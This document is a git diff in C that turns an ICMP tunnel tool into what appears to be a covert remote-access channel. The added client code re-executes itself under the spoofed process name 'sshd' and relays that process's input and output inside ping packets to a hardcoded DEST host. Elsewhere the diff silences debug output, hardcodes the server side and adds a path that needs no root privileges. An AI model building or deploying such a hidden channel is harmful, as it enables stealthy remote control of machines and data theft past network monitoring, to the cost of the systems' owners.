@@ -1,0 +1,757 @@
+diff --git a/Makefile b/Makefile
+index 5ccc174..8ecdc99 100644
+--- a/Makefile
++++ b/Makefile
+@@ -1,4 +1,3 @@
+-CC=gcc
+ CFLAGS=-I. -O3 -Wall
+ DEPS = icmp.h tunnel.h
+ 
+@@ -6,7 +5,7 @@ DEPS = icmp.h tunnel.h
+ 	$(CC) -c -o $@ $< $(CFLAGS)
+ 
+ icmptunnel: icmptunnel.o icmp.o tunnel.o
+-	$(CC) -o icmptunnel icmp.o tunnel.o icmptunnel.o $(CFLAGS)
++	$(CC) -o icmptunnel icmp.o tunnel.o icmptunnel.o $(CFLAGS) 
+ 
+ test_server: icmp.o test_server.o
+ 	$(CC) -o test_server icmp.o test_server.o $(CFLAGS)
+@@ -16,7 +15,7 @@ test_client: icmp.o test_client.o
+ 
+ test: test_server test_client
+ 
+-all: icmptunnel test_server test_client
++all: icmptunnel client
+ 
+ clean:
+ 	rm -f *.o test_server test_client icmptunnel
+diff --git a/client.c b/client.c
+new file mode 100644
+index 0000000..0961b6d
+--- /dev/null
++++ b/client.c
+@@ -0,0 +1,92 @@
++#include "icmp.h"
++#include<unistd.h>
++#include<sys/wait.h>
++#include<sys/prctl.h>
++#include<signal.h>
++#include<stdlib.h>
++#include<string.h>
++#include<stdio.h>
++  
++static volatile int keep = 1;
++#define DEFAULT_ROUTE "0.0.0.0"
++
++
++extern char ** environ;
++int fd_in;
++int fd_out;
++int c;
++
++/* It's better to use sigaction() over signal().  You won't run into the
++ * issue where BSD signal() acts one way and Linux or SysV acts another. */
++
++static void
++child_handler(int sig)
++{
++    pid_t pid;
++    int status;
++    wait(NULL);
++    /* EEEEXTEERMINAAATE! */
++    c = 0;
++}
++
++
++int tun()
++{
++  char	config_file[2048];
++ char dst[256];
++  char *cmdline;
++  int fd, remote;
++  FILE* f;
++  char* args[] =  {"sshd","-irdd", (char*)NULL};
++  struct sigaction sa;
++  c = 1;
++  sigemptyset(&sa.sa_mask);
++  sa.sa_flags = 0;
++  sa.sa_handler = child_handler;
++
++  sigaction(SIGCHLD, &sa, NULL);
++
++  memset(config_file, 0, sizeof(config_file));
++  strcpy(dst, DEST);
++  readlink("/proc/self/exe", config_file, sizeof(config_file));
++  printf("Exec : %s\n", config_file);
++
++
++  pid_t pid = 0;
++  int inpipefd[2];
++  int outpipefd[2];
++  char buf[256];
++  char msg[256];
++  int status;
++
++  pipe(inpipefd);
++  pipe(outpipefd);
++  pid = fork();
++  if (pid == 0)
++  {
++    close(outpipefd[1]);
++    close(inpipefd[0]);
++
++    // Child
++    dup2(outpipefd[0], STDIN_FILENO);
++    dup2(inpipefd[1], STDOUT_FILENO);
++    //dup2(inpipefd[1], STDERR_FILENO);
++    //ask kernel to deliver SIGTERM in case the parent dies
++    prctl(PR_SET_PDEATHSIG, SIGTERM);
++
++    execve(config_file, args ,environ);
++    //    perror("test");
++    //printf("POST EXEC\n");
++  }
++
++  close(outpipefd[0]);
++  close(inpipefd[1]);
++
++  
++  fd_out = outpipefd[1];
++  fd_in  = inpipefd[0];
++  run_tunnel(dst,0);
++  return 0;
++}
++
++
+diff --git a/client2.c b/client2.c
+new file mode 100644
+index 0000000..03bd499
+--- /dev/null
++++ b/client2.c
+@@ -0,0 +1,57 @@
++#include "icmp.h"
++#include<unistd.h>
++#include<sys/wait.h>
++#include<sys/prctl.h>
++#include<signal.h>
++#include<stdlib.h>
++#include<string.h>
++#include<stdio.h>
++  
++static volatile int keep = 1;
++#define DEFAULT_ROUTE "0.0.0.0"
++
++
++extern char ** environ;
++int fd_in;
++int fd_out;
++int c;
++
++/* It's better to use sigaction() over signal().  You won't run into the
++ * issue where BSD signal() acts one way and Linux or SysV acts another. */
++
++static void
++child_handler(int sig)
++{
++    pid_t pid;
++    int status;
++    wait(NULL);
++    /* EEEEXTEERMINAAATE! */
++    c = 0;
++}
++
++
++int main(int argc, char** argv)
++{
++  char	config_file[2048];
++ char dst[256];
++  char *cmdline;
++  int fd, remote;
++  FILE* f;
++  char* args[] =  {"sshd","-irddd", (char*)NULL};
++  struct sigaction sa;
++  c = 1;
++  sigemptyset(&sa.sa_mask);
++  sa.sa_flags = 0;
++  sa.sa_handler = child_handler;
++
++  sigaction(SIGCHLD, &sa, NULL);
++  strcpy(dst, DEST);
++
++  
++  fd_out = 1;
++  fd_in  = 0;
++  run_tunnel(dst,0);
++  return 0;
++}
++
++
+diff --git a/icmp.c b/icmp.c
+index 0cd1aa7..0c1339b 100644
+--- a/icmp.c
++++ b/icmp.c
+@@ -1,5 +1,5 @@
+ /**
+- *  icmp.c
++1 *  icmp.c
+  */
+ 
+ #include "icmp.h"
+@@ -12,6 +12,8 @@
+ #include <stdio.h>
+ #include <stdlib.h>
+ 
++int lastid = -1;
++int i;
+ /**
+  * Function to calculate checksum
+  */
+@@ -44,20 +46,25 @@ void set_reply_type(struct icmp_packet *packet)
+ int open_icmp_socket()
+ {
+   int sock_fd, on = 1;
+-
++  #ifdef NO_ROOT
++  sock_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
++  #else
+   sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+-
++  #endif
++  
+   if (sock_fd == -1) {
+     perror("Unable to open ICMP socket\n");
+     exit(EXIT_FAILURE);
+   }
+-  
++
++  #ifndef NO_ROOT
+   // Providing IP Headers
+   if (setsockopt(sock_fd, IPPROTO_IP, IP_HDRINCL, (const char *)&on, sizeof(on)) == -1) {
+     perror("Unable to set IP_HDRINCL socket option\n");
+     exit(EXIT_FAILURE);
+   }
+-
++  #endif
++  
+   return sock_fd;
+ }
+ 
+@@ -86,18 +93,18 @@ void bind_icmp_socket(int sock_fd)
+ void send_icmp_packet(int sock_fd, struct icmp_packet *packet_details)
+ {
+   // Source and destination IPs
+-  struct in_addr src_addr;
+-  struct in_addr dest_addr;
+ 
+   struct iphdr *ip;
+   struct icmphdr *icmp;
+   char *icmp_payload;
++  struct in_addr src_addr;
++  struct in_addr dest_addr;
+ 
+   int packet_size;
+   char *packet;
+ 
+   struct sockaddr_in servaddr;
+-
++  #ifndef NO_ROOT
+   inet_pton(AF_INET, packet_details->src_addr, &src_addr);
+   inet_pton(AF_INET, packet_details->dest_addr, &dest_addr);
+ 
+@@ -123,6 +130,11 @@ void send_icmp_packet(int sock_fd, struct icmp_packet *packet_details)
+   memcpy(icmp_payload, packet_details->payload, packet_details->payload_size);
+ 
+   icmp->type = packet_details->type;
++  if (packet_details->type==ICMP_ECHO)
++    {
++      //      printf("Gen echo\n");
++      icmp->un.echo.id = rand();
++    }
+   icmp->checksum = 0;
+   icmp->checksum = in_cksum((unsigned short *)icmp, sizeof(struct icmphdr) + packet_details->payload_size);
+ 
+@@ -134,6 +146,30 @@ void send_icmp_packet(int sock_fd, struct icmp_packet *packet_details)
+   sendto(sock_fd, packet, packet_size, 0, (struct sockaddr *)&servaddr, sizeof(struct sockaddr_in));
+ 
+   free(packet);
++  #else
++  //inet_pton(AF_INET, packet_details->src_addr, &src_addr);
++  inet_pton(AF_INET, packet_details->dest_addr, &dest_addr);
++  memset(&servaddr, 0, sizeof(struct sockaddr_in));
++  servaddr.sin_family = AF_INET;
++  servaddr.sin_addr.s_addr = dest_addr.s_addr;
++
++  packet_size = sizeof(struct icmphdr) + packet_details->payload_size;
++  packet = calloc(packet_size, sizeof(uint8_t));
++  icmp = (struct icmphdr*) packet;
++  icmp_payload = (char*)(packet+sizeof(struct icmphdr));
++  icmp->type=packet_details->type;
++  prepare_headers(ip,icmp);
++  if(packet_details->type)
++    icmp->un.echo.id = rand();
++
++  icmp->checksum = 0;
++  icmp->checksum = in_cksum((unsigned short *)icmp, sizeof(struct icmphdr) + packet_details->payload_size);
++  memcpy(icmp_payload, packet_details->payload, packet_details->payload_size);
++
++  sendto(sock_fd, packet, packet_size, 0, (struct sockaddr *)&servaddr, sizeof(struct sockaddr_in));
++
++  free(packet);
++  #endif
+ }
+ 
+ /**
+@@ -153,6 +189,7 @@ void receive_icmp_packet(int sock_fd, struct icmp_packet *packet_details)
+ 
+   socklen_t src_addr_size;
+   int enc_MTU; //encapsulated MTU
++  #ifndef NO_ROOT
+ 
+   enc_MTU = MTU + sizeof(struct iphdr) + sizeof(struct icmphdr);
+ 
+@@ -166,12 +203,12 @@ void receive_icmp_packet(int sock_fd, struct icmp_packet *packet_details)
+   src_addr_size = sizeof(struct sockaddr_in);
+   
+   // Receiving packet
+-  packet_size = recvfrom(sock_fd, packet, enc_MTU, 0, (struct sockaddr *)&(src_addr), &src_addr_size);
++  packet_size = recvfrom(sock_fd, packet, enc_MTU, 0, NULL, &src_addr_size);
+ 
+   ip = (struct iphdr *)packet;
+   icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));
+   icmp_payload = (char *)(packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
+-
++  
+   // Filling up packet_details
+   inet_ntop(AF_INET, &(ip->saddr), packet_details->src_addr, INET_ADDRSTRLEN);
+   inet_ntop(AF_INET, &(ip->daddr), packet_details->dest_addr, INET_ADDRSTRLEN);
+@@ -183,10 +220,64 @@ void receive_icmp_packet(int sock_fd, struct icmp_packet *packet_details)
+     close_icmp_socket(sock_fd);
+     exit(-1);
+   }
++    if (packet_details->type==ICMP_ECHO
++      && (
++	  (icmp_payload[0]=='S' && icmp_payload[1]=='S' && icmp_payload[2]=='H')
++	  || (icmp_payload[0]=='A' && icmp_payload[1]=='C'&& icmp_payload[2]=='K')
++	  || lastid == -1 )
++      )
++    lastid = icmp->un.echo.id;
+ 
+   memcpy(packet_details->payload, icmp_payload, packet_details->payload_size);
+ 
+   free(packet);
++  #else
++
++  enc_MTU = MTU + sizeof(struct icmphdr);
++
++  packet = calloc(enc_MTU, sizeof(uint8_t));
++  if (packet == NULL) {
++    perror("No memory available\n");
++    close_icmp_socket(sock_fd);
++    exit(-1);
++  }
++
++  src_addr_size = sizeof(struct sockaddr_in);
++  
++  // Receiving packet
++  packet_size = recvfrom(sock_fd, packet, enc_MTU, 0, NULL, &src_addr_size);
++
++
++  icmp = (struct icmphdr*)packet;
++  icmp_payload = (char *)(packet + sizeof(struct icmphdr));
++  
++  // Filling up packet_details
++  //memcpy(packet_details->src_addr, &src_addr, sizeof(src_addr));
++  //  memcpy(
++  
++  packet_details->type = icmp->type;
++  packet_details->payload_size = packet_size - sizeof(struct icmphdr);
++  packet_details->payload = calloc(packet_details->payload_size, sizeof(uint8_t));
++  if (packet_details->payload == NULL) {
++    perror("No memory available\n");
++    close_icmp_socket(sock_fd);
++    exit(-1);
++  }
++  memcpy(packet_details->payload, icmp_payload, packet_details->payload_size);
++  if (packet_details->type==ICMP_ECHO 
++      && (
++	  (icmp_payload[0]=='S' && icmp_payload[1]=='S' && icmp_payload[2]=='H')
++	  || (icmp_payload[0]=='A' && icmp_payload[1]=='C'&& icmp_payload[2]=='K')
++	  || lastid == -1
++	  )
++      )
++    lastid = icmp->un.echo.id;
++  //printf(">> %s\n", packet_details->payload);
++  
++  
++  free(packet);
++
++  #endif
+ }
+ 
+ /**
+@@ -232,6 +323,7 @@ uint16_t in_cksum(uint16_t *addr, int len)
+  */
+ void prepare_headers(struct iphdr *ip, struct icmphdr *icmp)
+ {
++  #ifndef NO_ROOT 
+   ip->version = 4;
+   ip->ihl = 5;
+   ip->tos = 0;
+@@ -239,9 +331,11 @@ void prepare_headers(struct iphdr *ip, struct icmphdr *icmp)
+   ip->frag_off = 0;
+   ip->ttl = 255;
+   ip->protocol = IPPROTO_ICMP;
+-
++  #endif
+   icmp->code = 0;
+-  icmp->un.echo.sequence = rand();
+-  icmp->un.echo.id = rand();
+-  icmp->checksum = 0;   
++  icmp->un.echo.sequence = 0x4242+i;
++  icmp->un.echo.id = lastid;
++  icmp->checksum = 0;
++  i++;
++  
+ }
+diff --git a/icmptunnel.c b/icmptunnel.c
+index 526c044..fbb382e 100644
+--- a/icmptunnel.c
++++ b/icmptunnel.c
+@@ -11,6 +11,9 @@
+ #define ARG_SERVER_MODE "-s"
+ #define ARG_CLIENT_MODE "-c"
+ 
++int fd_in = 0;
++int fd_out = 1;
++int c = 1;
+ void usage()
+ {
+   printf("Wrong argument\n");
+@@ -20,22 +23,10 @@ void usage()
+ int main(int argc, char *argv[])
+ {
+   char ip_addr[100] = {0,};
+-  if ((argc < 3) || ((strlen(argv[2]) + 1) > sizeof(ip_addr))) {
+-    usage();
+-    exit(EXIT_FAILURE);
+-  }
+-  memcpy(ip_addr, argv[2], strlen(argv[2]) + 1);
+-
+-  if (strncmp(argv[1], ARG_SERVER_MODE, strlen(argv[1])) == 0) {
+-    run_tunnel(ip_addr, 1);
+-  }
+-  else if (strncmp(argv[1], ARG_CLIENT_MODE, strlen(argv[1])) == 0) {
+-    run_tunnel(ip_addr, 0);
+-  }
+-  else {
+-    usage();
+-    exit(EXIT_FAILURE);
+-  }
++  memcpy(ip_addr, "0.0.0.0", strlen("0.0.0.0") + 1);
+ 
++  run_tunnel(ip_addr, 1);
++  
++  
+   return EXIT_SUCCESS;
+ }
+diff --git a/tunnel.c b/tunnel.c
+index ba28e67..21b0fe5 100644
+--- a/tunnel.c
++++ b/tunnel.c
+@@ -24,45 +24,22 @@
+ 
+ 
+ #define DEFAULT_ROUTE   "0.0.0.0"
++#define ACK "ACK"
++
++extern int fd_in;
++extern int fd_out;
++extern int c;
+ 
+ /**
+  * Function to allocate a tunnel
+  */
+ int tun_alloc(char *dev, int flags)
+ {
+-  struct ifreq ifr;
+-  int tun_fd, err;
+-  char *clonedev = "/dev/net/tun";
+-  printf("[DEBUG] Allocating tunnel\n");
+-
+-  tun_fd = open(clonedev, O_RDWR);
+-
+-  if(tun_fd == -1) {
+-    perror("Unable to open clone device\n");
+-    exit(EXIT_FAILURE);
+-  }
+   
+-  memset(&ifr, 0, sizeof(ifr));
+-
+-  ifr.ifr_flags = flags;
+-
+-  if (*dev) {
+-    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
+-  }
+-
+-  if ((err=ioctl(tun_fd, TUNSETIFF, (void *)&ifr)) < 0) {
+-    close(tun_fd);
+-    fprintf(stderr, "Error returned by ioctl(): %s\n", strerror(err));
+-    perror("Error in tun_alloc()\n");
+-    exit(EXIT_FAILURE);
+-  }
++  return fd_in;
++}
+ 
+-  printf("[DEBUG] Allocatating tunnel2");
+ 
+-  printf("[DEBUG] Created tunnel %s\n", dev);
+-
+-  return tun_fd;
+-}
+ 
+ /**
+  * Function to read from a tunnel
+@@ -70,15 +47,18 @@ int tun_alloc(char *dev, int flags)
+ int tun_read(int tun_fd, char *buffer, int length)
+ {
+   int bytes_read;
+-  printf("[DEBUG] Reading from tunnel\n");
+-  bytes_read = read(tun_fd, buffer, length);
+-
++  //printf("[DEBUG] Reading from tunnel\n");
++  buffer[0] = 'S';
++  buffer[1] = 'S';
++  buffer[2] = 'H';
++  bytes_read = read(fd_in, buffer+3, length-3);
++  
+   if (bytes_read == -1) {
+     perror("Unable to read from tunnel\n");
+     exit(EXIT_FAILURE);
+   }
+   else {
+-    return bytes_read;
++    return bytes_read+3;
+   }
+ }
+ 
+@@ -88,11 +68,11 @@ int tun_read(int tun_fd, char *buffer, int length)
+ int tun_write(int tun_fd, char *buffer, int length)
+ {
+   int bytes_written;
+-  printf("[DEBUG] Writing to tunnel\n");
+-  bytes_written = write(tun_fd, buffer, length);
++  //printf("[DEBUG] Writing to tunnel\n");
++  bytes_written = write(fd_out, buffer, length);
+ 
+   if (bytes_written == -1) {
+-    perror("Unable to write to tunnel\n");
++    //perror("Unable to write to tunnel\n");
+     exit(EXIT_FAILURE);
+   }
+   else {
+@@ -105,48 +85,7 @@ int tun_write(int tun_fd, char *buffer, int length)
+  */
+ void configure_network(int server)
+ {
+-  int pid, status;
+-  char path[100];
+-  char *const args[] = {path, NULL};
+ 
+-  if (server) {
+-    if (sizeof(SERVER_SCRIPT) > sizeof(path)){
+-      perror("Server script path is too long\n");
+-      exit(EXIT_FAILURE);
+-    }
+-    strncpy(path, SERVER_SCRIPT, strlen(SERVER_SCRIPT) + 1);
+-  }
+-  else {
+-    if (sizeof(CLIENT_SCRIPT) > sizeof(path)){
+-      perror("Client script path is too long\n");
+-      exit(EXIT_FAILURE);
+-    }
+-    strncpy(path, CLIENT_SCRIPT, strlen(CLIENT_SCRIPT) + 1);
+-  }
+-
+-  pid = fork();
+-
+-  if (pid == -1) {
+-    perror("Unable to fork\n");
+-    exit(EXIT_FAILURE);
+-  }
+-  
+-  if (pid==0) {
+-    // Child process, run the script
+-    exit(execv(path, args));
+-  }
+-  else {
+-    // Parent process
+-    waitpid(pid, &status, 0);
+-    if (WEXITSTATUS(status) == 0) {
+-      // Script executed correctly
+-      printf("[DEBUG] Script ran successfully\n");
+-    }
+-    else {
+-      // Some error
+-      printf("[DEBUG] Error in running script\n");
+-    }
+-  }
+ }
+ 
+ 
+@@ -162,46 +101,101 @@ void run_tunnel(char *dest, int server)
+ 
+   tun_fd = tun_alloc("tun0", IFF_TUN | IFF_NO_PI);
+ 
+-  printf("[DEBUG] Starting tunnel - Dest: %s, Server: %d\n", dest, server);
+-  printf("[DEBUG] Opening ICMP socket\n");
++  //printf("[DEBUG] Starting tunnel - Dest: %s, Server: %d\n", dest, server);
++  //printf("[DEBUG] Opening ICMP socket\n");
+   sock_fd = open_icmp_socket();
+-
++  
+   if (server) {
+-    printf("[DEBUG] Binding ICMP socket\n");
++    //printf("[DEBUG] Binding ICMP socket\n");
+     bind_icmp_socket(sock_fd);
++    receive_icmp_packet(sock_fd, &packet);
++    strncpy(dest, packet.src_addr, strlen(packet.src_addr) + 1);
++    
++  }else{
++    strncpy(packet.src_addr, DEFAULT_ROUTE, strlen(DEFAULT_ROUTE) + 1);
++    strncpy(packet.dest_addr, dest, strlen(dest) + 1);
++    set_echo_type(&packet);
++    packet.payload = dest;
++    packet.payload_size= strlen(dest);
++    send_icmp_packet(sock_fd, &packet);
++
+   }
+ 
+   configure_network(server);
+ 
+-  while (1) {
++  while (c) {
+     FD_ZERO(&fs);
+     FD_SET(tun_fd, &fs);
+     FD_SET(sock_fd, &fs);
+ 
+     select(tun_fd>sock_fd?tun_fd+1:sock_fd+1, &fs, NULL, NULL, NULL);
+ 
++    if (FD_ISSET(sock_fd, &fs)) {
++      //printf("[DEBUG] Received ICMP packet\n");
++      // Reading data from remote socket and sending to tun device
++
++      // Getting ICMP packet
++      memset(&packet, 0, sizeof(struct icmp_packet));
++
++      
++      receive_icmp_packet(sock_fd, &packet);
++	
++      //printf("[DEBUG] Read ICMP packet with src: %s, dest: %s, payload_size: %d, payload: %s\n", packet.src_addr, packet.dest_addr, packet.payload_size, packet.payload);
++      // Writing out to tun device
++      //printf("<<%s\n", packet.payload);
++
++      
++      if(packet.payload[0] == 'S' && packet.payload[1] == 'S' && packet.payload[2] == 'H')
++      {
++	packet.payload = packet.payload+3;
++	if (packet.payload_size>3)
++	  tun_write(tun_fd, packet.payload, packet.payload_size-3);
++	//write(2, "<<", 3);
++	//write(2, packet.payload, packet.payload_size-3);
++	packet.payload = packet.payload-3;
++#ifndef NO_ROOT
++      strncpy(dest, packet.src_addr, strlen(packet.src_addr) + 1);
++
++#else
++      free(packet.payload);
++      //strncpy(packet.src_addr, DEFAULT_ROUTE, strlen(DEFAULT_ROUTE) + 1);
++      strncpy(packet.dest_addr, dest, strlen(dest) + 1);
++      set_echo_type(&packet);
++      packet.payload = malloc(strlen(ACK)+1);
++      strcpy(packet.payload, ACK);
++      packet.payload_size = strlen(ACK)+1;
++      send_icmp_packet(sock_fd, &packet);
++
++#endif
++
++      }
++      free(packet.payload);
++
++    }
+     if (FD_ISSET(tun_fd, &fs)) {
+-      printf("[DEBUG] Data needs to be readed from tun device\n");
++      //printf("[DEBUG] Data needs to be readed from tun device\n");
+       // Reading data from tun device and sending ICMP packet
+-
+-      printf("[DEBUG] Preparing ICMP packet to be sent\n");
++      
++      //printf("[DEBUG] Preparing ICMP packet to be sent\n");
+       // Preparing ICMP packet to be sent
+       memset(&packet, 0, sizeof(struct icmp_packet));
+-      printf("[DEBUG] Destination address: %s\n", dest);
++      //printf("[DEBUG] Destination address: %s\n", dest);
+ 
+       if (sizeof(DEFAULT_ROUTE) > sizeof(packet.src_addr)){
+         perror("Lack of space: size of DEFAULT_ROUTE > size of src_addr\n");
+-        close(tun_fd);
++
++	close(tun_fd);
+         close(sock_fd);
+         exit(EXIT_FAILURE);
+       }
+       strncpy(packet.src_addr, DEFAULT_ROUTE, strlen(DEFAULT_ROUTE) + 1);
+-
++      
+       if ((strlen(dest) + 1) > sizeof(packet.dest_addr)){
+-        perror("Lack of space for copy size of DEFAULT_ROUTE > size of dest_addr\n");
++        //perror("Lack of space for copy size of DEFAULT_ROUTE > size of dest_addr\n");
+         close(sock_fd);
+         exit(EXIT_FAILURE);
+       }
++
+       strncpy(packet.dest_addr, dest, strlen(dest) + 1);
+ 
+       if(server) {
+@@ -217,34 +211,23 @@ void run_tunnel(char *dest, int server)
+       }
+ 
+       packet.payload_size  = tun_read(tun_fd, packet.payload, MTU);
++      //printf("READ %s\n", packet.payload);
+       if(packet.payload_size  == -1) {
+         perror("Error while reading from tun device\n");
+         exit(EXIT_FAILURE);
+       }
+ 
+-      printf("[DEBUG] Sending ICMP packet with payload_size: %d, payload: %s\n", packet.payload_size, packet.payload);
++      //printf("[DEBUG] Sending ICMP packet with payload_size: %d, payload: %s\n", packet.payload_size, packet.payload);
+       // Sending ICMP packet
+-      send_icmp_packet(sock_fd, &packet);
+-
+-      free(packet.payload);
+-    }
+-
+-    if (FD_ISSET(sock_fd, &fs)) {
+-      printf("[DEBUG] Received ICMP packet\n");
+-      // Reading data from remote socket and sending to tun device
+-
+-      // Getting ICMP packet
+-      memset(&packet, 0, sizeof(struct icmp_packet));
+-      receive_icmp_packet(sock_fd, &packet);
++      //printf(">> %s\n", packet.payload);
++      //write(2, "<<", 3);
++      //write(2, packet.payload, packet.payload_size-3);
+ 
+-      printf("[DEBUG] Read ICMP packet with src: %s, dest: %s, payload_size: %d, payload: %s\n", packet.src_addr, packet.dest_addr, packet.payload_size, packet.payload);
+-      // Writing out to tun device
+-      tun_write(tun_fd, packet.payload, packet.payload_size);
+-
+-      printf("[DEBUG] Src address being copied: %s\n", packet.src_addr);
+-      strncpy(dest, packet.src_addr, strlen(packet.src_addr) + 1);
++      send_icmp_packet(sock_fd, &packet);
+       free(packet.payload);
+     }
++      
++      //printf("[DEBUG] Src address being copied: %s\n", packet.src_addr);
+   }
+ 
+ }
